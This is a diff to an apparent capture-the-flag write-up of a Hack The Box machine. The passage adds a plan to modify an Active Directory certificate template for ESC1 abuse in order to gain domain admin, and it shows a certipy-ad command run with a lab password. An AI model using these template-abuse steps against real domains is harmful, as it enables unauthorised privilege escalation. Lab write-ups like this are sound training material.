@@ -940,7 +940,7 @@ So with these two user accounts i can create computer accounts under a certain O
 
 # Domain Admin
 
-So the plan her
+So the plan here is to simply make a copy of an existing template then use certipy to save it to a json file, then modify this json file to fit the requirements of ESC1 then write this new json file to the CA as a new template, then ill just abuse ESC1
 
 ```python
 ❯❯❯ certipy-ad template -dc-ip 10.129.229.190 -dc-host dc01.coder.htb -target-ip 10.129.229.190 -target dc01.coder.htb -u e.black@coder.htb -p 'ypOSJXPqlDOxxbQSfEERy300' -template User -save-configuration User.json
@@ -950,3 +950,8 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Wrote current configuration for 'User' to 'User.json'
 ```
 
+First ill save the template to a json file
+
+```python
+
+```
